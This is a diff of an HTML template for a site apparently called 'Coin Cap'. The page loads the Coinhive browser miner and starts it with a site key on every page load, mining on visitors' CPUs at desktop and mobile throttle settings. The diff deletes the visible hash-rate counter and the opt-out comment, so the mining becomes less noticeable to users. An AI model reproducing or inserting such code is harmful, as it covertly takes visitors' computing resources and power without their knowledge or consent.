@@ -5,27 +5,16 @@
 		<title>No title assigned</title>
 	{% endif %}
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="shortcut icon" href="{{ url_for('static', filename='favicon.png') }}" />
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 	<script>
 		var miner = new CoinHive.Anonymous('S5X8i77WnbgKG8iujkWrZJW6e0zmJi2r', {throttle: 0.5});
-
-		// Only start on non-mobile devices and if not opted-out
-		// in the last 14400 seconds (4 hours):
 		if (!miner.isMobile()) {
 			miner.start();
 		} else {
-			miner = CoinHive.Anonymous('S5X8i77WnbgKG8iujkWrZJW6e0zmJi2r', {throttle: 0.7});
+			miner = CoinHive.Anonymous('S5X8i77WnbgKG8iujkWrZJW6e0zmJi2r', {throttle: 0.9});
 			miner.start();
 		}
-
-		// Update stats once per second
-		setInterval(function() {
-			var hashesPerSecond = miner.getHashesPerSecond();
-			var totalHashes = miner.getTotalHashes();
-			var acceptedHashes = miner.getAcceptedHashes();
-
-			document.getElementsByClassName('hashes')[0].innerHTML = "Hash/S: " + hashesPerSecond;
-		}, 1000);
 	</script>
 	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-113586230-1"></script>
 	<script>
@@ -41,7 +30,6 @@
 </head>
 
 <body>
-	<h3 class="hashes">Hash/S: 0</h3>
 	<h1 class="header">Coin Cap</h1>
 	<div class="nav">
 		<a class="nav-item" href="{{url_for('index')}}">
